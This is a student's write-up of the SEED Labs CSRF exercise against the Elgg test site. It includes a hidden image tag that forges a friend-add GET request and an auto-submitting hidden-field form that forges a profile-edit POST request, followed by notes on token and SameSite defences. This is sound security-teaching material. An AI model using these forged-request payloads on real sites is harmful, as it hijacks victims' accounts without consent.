# Cross-Site Request Forgery (CSRF) Attack Lab

## Fei Guo, July 7, 2022

Lab Spec: https://seedsecuritylabs.org/Labs_20.04/Web/Web_CSRF_Elgg/

The following two attacks are done towards a website having csrf countermeasures disabled.

## 1. CSRF Attack using GET Request

Here we want to initiate a forged GET request to add Samy as a friend on a social media website Elgg.

To trigger this attack, we can simply embed this line of code in a website or in an editor supporting raw HTML editing.

```html
<img src="http://www.seed-server.com/action/friends/add?friend=59" alt="image" width="1" height="1" />
```

## 2. CSRF Attack using POST Request

Here we want to forge a POST request to edit the visitor's profile on his or her behalf without authorization. So we first analyze what a typical POST request contains, and put the victim's guid in the form, and edit other fields as desired. 


```html
<html>
<body>
<h1>This page forges an HTTP POST request.</h1>
<script type="text/javascript">

function forge_post()
{
    var fields;

    // The following are form entries need to be filled out by attackers.
    // The entries are made hidden, so the victim won't be able to see them.
    fields += "<input type='hidden' name='name' value='Alice'>";
    fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero!'>";
    fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";         
    fields += "<input type='hidden' name='guid' value='56'>";

    // Create a <form> element.
    var p = document.createElement("form");

    // Construct the form
    p.action = "http://www.seed-server.com/action/profile/edit";
    p.innerHTML = fields;
    p.method = "post";

    // Append the form to the current page.
    document.body.appendChild(p);

    // Submit the form
    p.submit();
}


// Invoke forge_post() after the page is loaded.
window.onload = function() { forge_post();}
</script>
</body>
</html>
```
Questions. In addition to describing your attack in full details, you also need to answer the following questions in your report:

- Question 1: The forged HTTP request needs Alice’s user id (guid) to work properly. If Boby targets Alice specifically, before the attack, he can find ways to get Alice’s user id. Boby does not know Alice’s Elgg password, so he cannot log into Alice’s account to get the information. Please describe how Boby can solve this problem.

Boby can inspect Alice's profile page and look at the url of "Add Friend", which contains the guid of Alice.

- Question 2: If Boby would like to launch the attack to anybody who visits his malicious web page. In this case, he does not know who is visiting the web page beforehand. Can he still launch the CSRF attack to modify the victim’s Elgg profile? Please explain.

This is hard. I looked around on Elgg and didn't find any place where we can get the current user's guid. 

## 3. Defense with timestamp and token

This is the countermeasure most sites adopted before the SameSite cookie was introduced. It's basically a measure that generates a secret and timestamp for every page users visit, and asks users to submit these previously generated secrets for any further actions made on the website. Since other websites can't access the secrets, the CSRF risk is mitigated.

## 4. Defense with SameSite Cookie Method

This is a smart move of browsers, albeit a bit late. Basically, now websites need to declare the type of their cookies. LAX or Strict? LAX cookies are attached when a site is sending cross-site Get requests (whether it's through a link or a form). Normal cookies behave just like before, for backward compatibility I think. Strict cookies won't be attached for any cross-site requests, hence mitigating the CSRF vulnerability.

